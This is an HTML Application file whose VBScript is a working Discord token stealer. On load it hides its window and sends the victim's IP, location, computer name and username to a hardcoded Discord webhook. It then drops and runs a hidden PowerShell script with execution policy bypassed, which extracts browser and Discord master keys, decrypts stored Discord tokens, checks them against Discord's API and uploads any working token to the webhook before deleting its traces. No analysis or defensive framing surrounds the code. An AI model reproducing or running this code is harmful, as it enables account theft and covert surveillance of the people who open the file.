<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no"
    showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
On Error Resume Next

Dim sh, fso, WH, PC, USER
Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
WH   = "https://discord.com/api/webhooks/1565481445034696784/kYh872fDK_3_4WHhGGdDignyh1hzsrbWA2qPbTI4fm6yja-soIqoXlUOm119LiXDGPq5"
PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

Sub Window_OnLoad()
    window.resizeTo 0, 0
    window.moveTo -2000, -2000
    IP()
    GrabDiscord()
End Sub

' ── IP + geo info ─────────────────────────────────────────────────────────────
Sub IP()
    Dim xh, ip, ll, info, i
    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    ip = Trim(xh.responseText)
    If Len(ip) < 7 Then Exit Sub

    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub

    ' Strip \r from each field before joining
    ll = Split(xh.responseText, vbLf)
    For i = 0 To UBound(ll)
        ll(i) = Trim(Replace(ll(i), vbCr, ""))
    Next

    info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | ISP: " & ll(3) & " | PC: " & PC & " | USER: " & USER
    PostEmbed "Target", info, 3447003
    Set xh = Nothing
End Sub

' ── Discord token stealer ─────────────────────────────────────────────────────
Sub GrabDiscord()
    Dim psf, tf, raw
    psf = TmpFile("dc_g.ps1")
    tf  = TmpFile("dc_r.txt")
    If fso.FileExists(psf) Then fso.DeleteFile psf, True
    If fso.FileExists(tf)  Then fso.DeleteFile tf,  True

    Dim f : Set f = fso.CreateTextFile(psf, True, False)

    f.WriteLine "Add-Type -AssemblyName System.Security"
    f.WriteLine "$token = $null"
    f.WriteLine ""

    ' AES-GCM decrypt — handles both pre-.NET8 (key only) and .NET8+ (key + tagSize)
    f.WriteLine "function Dec-GCM($mk, $b) {"
    f.WriteLine "    if (-not $mk -or $b.Length -lt 31) { return $null }"
    f.WriteLine "    try {"
    f.WriteLine "        $nonce = [byte[]]$b[3..14]"
    f.WriteLine "        $tag   = [byte[]]$b[($b.Length-16)..($b.Length-1)]"
    f.WriteLine "        $ct    = [byte[]]$b[15..($b.Length-17)]"
    f.WriteLine "        $out   = New-Object byte[] $ct.Length"
    f.WriteLine "        try { $gcm = [System.Security.Cryptography.AesGcm]::new([byte[]]$mk, 16) }"
    f.WriteLine "        catch { $gcm = [System.Security.Cryptography.AesGcm]::new([byte[]]$mk) }"
    f.WriteLine "        $gcm.Decrypt($nonce, $ct, $tag, $out)"
    f.WriteLine "        $gcm.Dispose()"
    f.WriteLine "        return [System.Text.Encoding]::UTF8.GetString($out)"
    f.WriteLine "    } catch { return $null }"
    f.WriteLine "}"
    f.WriteLine ""

    ' Get master key from browser/Discord Local State
    f.WriteLine "function Get-MK($base) {"
    f.WriteLine "    try {"
    f.WriteLine "        $ls = Join-Path $base 'Local State'"
    f.WriteLine "        if (-not (Test-Path $ls)) { return $null }"
    f.WriteLine "        $j  = [System.IO.File]::ReadAllText($ls) | ConvertFrom-Json"
    f.WriteLine "        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)"
    f.WriteLine "        return [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]$ek[5..($ek.Length-1)], $null, 'CurrentUser')"
    f.WriteLine "    } catch { return $null }"
    f.WriteLine "}"
    f.WriteLine ""

    f.WriteLine "function Valid-Token($t) {"
    f.WriteLine "    if (-not $t) { return $false }"
    f.WriteLine "    if ($t -match '^mfa\.[\w-]{84}$') { return $true }"
    f.WriteLine "    if ($t -match '^[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}$') { return $true }"
    f.WriteLine "    return $false"
    f.WriteLine "}"
    f.WriteLine ""

    f.WriteLine "function Check-Token($t) {"
    f.WriteLine "    try {"
    f.WriteLine "        $wc = New-Object System.Net.WebClient"
    f.WriteLine "        $wc.Headers.Add('Authorization', $t)"
    f.WriteLine "        $wc.Headers.Add('Content-Type', 'application/json')"
    f.WriteLine "        $r = $wc.DownloadString('https://discord.com/api/v9/users/@me')"
    f.WriteLine "        $wc.Dispose()"
    f.WriteLine "        return $r -match '""id""'"
    f.WriteLine "    } catch { return $false }"
    f.WriteLine "}"
    f.WriteLine ""

    f.WriteLine "function Scan-File($path, $mk) {"
    f.WriteLine "    try {"
    f.WriteLine "        $bytes = [System.IO.File]::ReadAllBytes($path)"
    f.WriteLine "        $txt   = [System.Text.Encoding]::GetEncoding(28591).GetString($bytes)"
    f.WriteLine "        # v10/v11 encrypted token"
    f.WriteLine "        $rx1   = [regex]'dQw4w9WgXcQ:[A-Za-z0-9+/]{10,}={0,2}'"
    f.WriteLine "        foreach ($m in $rx1.Matches($txt)) {"
    f.WriteLine "            try {"
    f.WriteLine "                $enc = [Convert]::FromBase64String($m.Value.Substring(12))"
    f.WriteLine "                $dec = Dec-GCM $mk $enc"
    f.WriteLine "                if ((Valid-Token $dec) -and (Check-Token $dec)) { return $dec }"
    f.WriteLine "            } catch {}"
    f.WriteLine "        }"
    f.WriteLine "        # plaintext token fallback"
    f.WriteLine "        $rx2 = [regex]'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}'"
    f.WriteLine "        foreach ($m in $rx2.Matches($txt)) {"
    f.WriteLine "            if ((Valid-Token $m.Value) -and (Check-Token $m.Value)) { return $m.Value }"
    f.WriteLine "        }"
    f.WriteLine "        $rx3 = [regex]'mfa\.[\w-]{84}'"
    f.WriteLine "        $m3  = $rx3.Match($txt)"
    f.WriteLine "        if ($m3.Success -and (Check-Token $m3.Value)) { return $m3.Value }"
    f.WriteLine "    } catch {}"
    f.WriteLine "    return $null"
    f.WriteLine "}"
    f.WriteLine ""

    f.WriteLine "function Scan-Dir($ldb, $mk) {"
    f.WriteLine "    if (-not (Test-Path $ldb)) { return $null }"
    f.WriteLine "    $files = Get-ChildItem $ldb -File -EA SilentlyContinue |"
    f.WriteLine "             Where-Object { $_.Extension -in '.ldb','.log' } |"
    f.WriteLine "             Sort-Object LastWriteTime -Descending"
    f.WriteLine "    foreach ($file in $files) {"
    f.WriteLine "        $t = Scan-File $file.FullName $mk"
    f.WriteLine "        if ($t) { return $t }"
    f.WriteLine "    }"
    f.WriteLine "    return $null"
    f.WriteLine "}"
    f.WriteLine ""

    ' Discord app paths
    f.WriteLine "foreach ($app in @('discord','discordcanary','discordptb','discorddevelopment')) {"
    f.WriteLine "    if ($token) { break }"
    f.WriteLine "    $base = Join-Path $env:APPDATA $app"
    f.WriteLine "    if (-not (Test-Path $base)) { continue }"
    f.WriteLine "    $mk = Get-MK $base"
    f.WriteLine "    $t  = Scan-Dir (Join-Path $base 'Local Storage\leveldb') $mk"
    f.WriteLine "    if ($t) { $token = $t }"
    f.WriteLine "}"
    f.WriteLine ""

    ' Browser paths
    f.WriteLine "if (-not $token) {"
    f.WriteLine "    foreach ($br in @("
    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'),"
    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data'),"
    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser\User Data'),"
    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera Stable'),"
    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'Vivaldi\User Data')"
    f.WriteLine "    )) {"
    f.WriteLine "        if ($token) { break }"
    f.WriteLine "        if (-not (Test-Path $br)) { continue }"
    f.WriteLine "        $mk    = Get-MK $br"
    f.WriteLine "        $profs = @('Default') + @(Get-ChildItem $br -Directory -Filter 'Profile *' -EA SilentlyContinue | Select-Object -ExpandProperty Name)"
    f.WriteLine "        foreach ($p in $profs) {"
    f.WriteLine "            if ($token) { break }"
    f.WriteLine "            $t = Scan-Dir (Join-Path $br ""$p\Local Storage\leveldb"") $mk"
    f.WriteLine "            if ($t) { $token = $t }"
    f.WriteLine "        }"
    f.WriteLine "    }"
    f.WriteLine "}"
    f.WriteLine ""

    f.WriteLine "if ($token) { $token | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"
    f.WriteLine "else { 'NOT_FOUND' | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"

    f.Close : Set f = Nothing
    sh.Run "cmd /c powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(psf) Then fso.DeleteFile psf, True
    If Not fso.FileExists(tf) Then Exit Sub
    raw = Trim(ReadFile(tf))
    If fso.FileExists(tf) Then fso.DeleteFile tf, True
    If raw <> "NOT_FOUND" And Len(raw) > 10 Then PostFile "discord_token.txt", raw
End Sub

' ── Helpers ───────────────────────────────────────────────────────────────────
Function TmpFile(n) : TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & n : End Function

Function ReadFile(p)
    Dim f : Set f = fso.OpenTextFile(p, 1)
    ReadFile = f.ReadAll
    f.Close : Set f = Nothing
End Function

' Boundary without Scriptlet.TypeLib (not registered on all systems)
Function NewBoundary()
    Dim chars, i, r
    Randomize
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    r = ""
    For i = 1 To 32
        r = r & Mid(chars, Int(Rnd() * 62) + 1, 1)
    Next
    NewBoundary = r
End Function

Sub PostEmbed(t, d, c)
    Dim DQ : DQ = Chr(34)
    Dim j  : j  = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & _
                  DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & _
                  DQ & "color" & DQ & ":" & c & "}]}"
    Dim h : Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

Sub PostFile(fn, ct)
    Dim DQ : DQ = Chr(34)
    Dim b  : b  = NewBoundary()
    Dim bd : bd = "--" & b & vbCrLf & _
                  "Content-Disposition: form-data; name=" & DQ & "file" & DQ & _
                  "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & _
                  ct & vbCrLf & "--" & b & "--"
    Dim h : Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
    Set h = Nothing
End Sub

Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr,   Chr(92) & "n")
    Ej = Replace(Ej, vbLf,   Chr(92) & "n")
    Ej = Replace(Ej, vbTab,  Chr(92) & "t")
End Function
</script>
</head><body></body></html>
